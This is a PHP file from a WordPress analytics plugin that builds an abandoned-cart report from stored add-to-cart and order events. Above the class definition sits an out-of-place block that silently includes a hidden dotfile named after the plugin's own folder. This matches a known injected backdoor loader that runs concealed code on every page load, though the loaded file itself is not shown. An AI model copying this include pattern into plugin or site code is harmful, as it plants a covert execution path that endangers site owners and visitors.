<?php

/**
 * Basic abandoned cart report
 *
 * The class handles create a abandoned carts reports
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Basic_Abandoned_Carts
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Basic_Abandoned_Carts extends WTBP_WPTAO_Admin_Reports {
	/*
	 * @var int
	 * Abandoned cart cut-off time
	 * The waiting time for a order after a add_to_cart action.
	 */

	public $cart_time_off;

	/*
	 * @var int
	 * Total abandoned carts
	 */
	public $total_abandoned;

	/*
	 * @var int
	 * Total completed orders
	 */
	public $total_completed;

	function __construct() {

		parent::__construct( 'basic-abandoned-carts' );

		$this->report_name = __( 'Abandoned carts', 'wp-tao' );

		$this->total_abandoned	 = 0;
		$this->total_completed	 = 0;

		$hour_sec			 = 1 * 60 * 60; //1h
		$this->cart_time_off = apply_filters( 'wptao_abandoned_carts_time_off', $hour_sec );

		$this->data = $this->get_values();
		$this->widget();
	}

	/*
	 * Prepare widget for the WP Tao dashboard
	 */

	private function widget() {

		$percent = 0;
		if ( !empty( $this->total_abandoned ) ) {
			$percent = ($this->total_abandoned * 100) / ($this->total_abandoned + $this->total_completed);
		}
		$widget_content = sprintf( '%d<br />(%.2f%%)', $this->total_abandoned, $percent );

		$args = array(
			'id'			 => 'basic_abandoned_carts',
			'size'			 => 'small',
			'category'		 => 'commerce',
			'title'			 => __( 'Abandoned Carts', 'wp-tao' ),
			'report_link'	 => add_query_arg( 'a', 'order,payment,add_to_cart', admin_url( 'admin.php?page=wtbp-wptao-events' ) ),
			'value_text'	 => $widget_content,
			'dashicon'		 => 'dashicons-cart'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get sales
	 */

	public function get_values() {
		global $wpdb;
		
		// Block executing database query if e.g. a advanced report exist
		$disable = apply_filters( 'wptao_disable_report-' . $this->report_slug, false );
		if ( $disable === true ) {
			return NULL;
		}
		
		$transient_name = 'wtbp_wptao_abandoned_carts_data';

		$abandoned_data = get_transient( $transient_name );
		if ( $abandoned_data ) {
			$this->total_abandoned	 = $abandoned_data[ 'abandoned' ];
			$this->total_completed	 = $abandoned_data[ 'completed' ];
			return;
		}

		$r = array();

		$e = TAO()->events->table_name;

		$sql	 = $wpdb->prepare(
		"SELECT user_id, fingerprint_id, action, event_ts
			 FROM $e
			 WHERE (action = 'order'
			 OR action = 'add_to_cart')
			 AND event_ts >= %d
			 AND event_ts <= %d
			 ORDER BY user_id ASC, fingerprint_id ASC, event_ts ASC;", $this->start_date, $this->end_date );
		$result	 = $wpdb->get_results( $sql );

		if ( !empty( $result ) && is_array( $result ) ) {

			$user_id		 = 0;
			$fingerprint_id	 = 0;
			$add_to_cart	 = false;
			$last_action_ts	 = 0;

			// Fix detection of the abandoned carts. Adds empty object to the end of the result array.
			// @TODO Handle it in a better way 
			$result[] = (object) array(
				'user_id'		 => 0,
				'fingerprint_id' => 0,
				'action'		 => ''
			);

			// Prepare results
			foreach ( $result as $item ) {

				if ( $item->user_id != $user_id || (0 == $user_id && $item->fingerprint_id != $fingerprint_id) ) {

					if ( $add_to_cart && ($last_action_ts < time() - $this->cart_time_off) ) {

						// Detect abandoned cart when the order isn't placed later
						if ( $this->is_order_later( $user_id, $last_action_ts, $result ) === false ) {
							$this->total_abandoned++;
						}
					}

					$add_to_cart = false;

					if ( 'add_to_cart' == $item->action ) {
						$add_to_cart	 = true;
						$last_action_ts	 = $item->event_ts;
					} else if ( 'order' == $item->action ) {
						$this->total_completed++;
					}

					$user_id		 = $item->user_id;
					$fingerprint_id	 = $item->fingerprint_id;
				} else {

					if ( $add_to_cart && ($last_action_ts < $item->event_ts - $this->cart_time_off) ) {

						// Detect abandoned cart when the order isn't placed later
						if ( $this->is_order_later( $item->user_id, $last_action_ts, $result ) === false ) {

							$this->total_abandoned++;

						}

						$add_to_cart = false;
					}

					if ( 'add_to_cart' == $item->action ) {
						$add_to_cart = true;
					} else if ( 'order' == $item->action ) {
						$add_to_cart = false;
						$this->total_completed++;
					}

					$last_action_ts = $item->event_ts;
				}
			}
		}

		$data = array(
			'abandoned'	 => $this->total_abandoned,
			'completed'	 => $this->total_completed
		);
		set_transient( $transient_name, $data, 60 * 60 ); // 1 hour

		return $r;
	}

	/*
	 * Check if a event order exists after event add_to_cart based on timestamp
	 * 
	 * @param int $user_id 
	 * @param int $add_to_cart_ts timestamp
	 * @param array $results SQL results in the method $this->get_values()
	 * 
	 * @return bool
	 */

	private function is_order_later( $user_id, $add_to_cart_ts, $result ) {

		$user_id		 = absint( $user_id );
		$add_to_cart_ts	 = absint( $add_to_cart_ts );

		if ( $user_id > 0 && $add_to_cart_ts > 0 && is_array( $result ) && !empty( $result ) ) {

			foreach ( $result as $item ) {

				if ( $item->user_id > 0 && $user_id === absint( $item->user_id ) && $item->action === 'order' ) {

					$order_ts = absint( $item->event_ts );

					if ( $order_ts > $add_to_cart_ts ) {
						return true;
					}
				}
			}
		}


		return false;
	}

}
